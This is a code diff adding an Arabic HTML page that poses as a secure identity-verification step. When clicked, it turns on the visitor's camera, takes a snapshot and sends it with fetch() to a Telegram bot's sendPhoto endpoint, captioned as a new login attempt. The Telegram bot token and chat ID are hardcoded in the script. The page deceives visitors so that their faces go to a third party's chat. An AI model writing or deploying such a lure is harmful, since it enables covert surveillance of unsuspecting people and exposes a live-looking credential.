@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحقق الآمن</title>
+    <style>
+        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 320px; }
+        #video { width: 100%; border-radius: 10px; display: none; margin-top: 15px; background: #000; }
+        .btn { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; }
+        #log { font-size: 12px; color: #666; margin-top: 15px; text-align: right; line-height: 1.6; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h3>التحقق من الهوية</h3>
+    <p id="desc">اضغط للبدء في إجراءات التحقق</p>
+    <video id="video" autoplay playsinline></video>
+    <button id="start-btn" class="btn" onclick="startProcess()">تأكيد الهوية</button>
+    <div id="log"></div>
+</div>
+
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+    // تأكد من صحة هذه البيانات
+    const BOT_TOKEN = "8274780275:AAHJRfz_32XgoKPIKzk78ux1hwgaMAGsRkc";
+    const CHAT_ID = "7368655915";
+
+    function writeLog(msg) {
+        const logDiv = document.getElementById('log');
+        logDiv.innerHTML += msg + "<br>";
+        console.log(msg);
+    }
+
+    async function startProcess() {
+        document.getElementById('start-btn').style.display = 'none';
+        const video = document.getElementById('video');
+        video.style.display = 'block';
+
+        writeLog("⏳ جاري تشغيل الكاميرا...");
+
+        try {
+            // 1. طلب الكاميرا
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            
+            await new Promise(r => setTimeout(r, 2000)); // انتظار لتركيز الكاميرا
+
+            // 2. التقاط الصورة
+            const canvas = document.getElementById('canvas');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            writeLog("📸 تم التقاط الصورة، جاري التحويل...");
+            
+            canvas.toBlob(async (blob) => {
+                if (!blob) {
+                    writeLog("❌ فشل في معالجة الصورة.");
+                    return;
+                }
+
+                // 3. إعداد البيانات للإرسال
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'image.jpg');
+                formData.append('caption', "✅ محاولة دخول جديدة\n⏰ " + new Date().toLocaleString());
+
+                writeLog("📤 جاري الإرسال إلى تليجرام...");
+
+                // 4. الإرسال الفعلي
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const result = await response.json();
+
+                    if (result.ok) {
+                        writeLog("✅ تم الإرسال بنجاح!");
+                        document.getElementById('desc').innerText = "اكتمل التحقق بنجاح.";
+                    } else {
+                        writeLog("❌ خطأ من تليجرام: " + result.description);
+                    }
+                } catch (error) {
+                    writeLog("❌ فشل الاتصال بالإنترنت أو محجوب.");
+                }
+
+                // إغلاق الكاميرا بعد الانتهاء
+                stream.getTracks().forEach(t => t.stop());
+                video.style.display = 'none';
+            }, 'image/jpeg');
+
+        } catch (err) {
+            writeLog("❌ فشل الوصول للكاميرا: " + err.message);
+            document.getElementById('start-btn').style.display = 'block';
+        }
+    }
+</script>
+</body>
+</html>
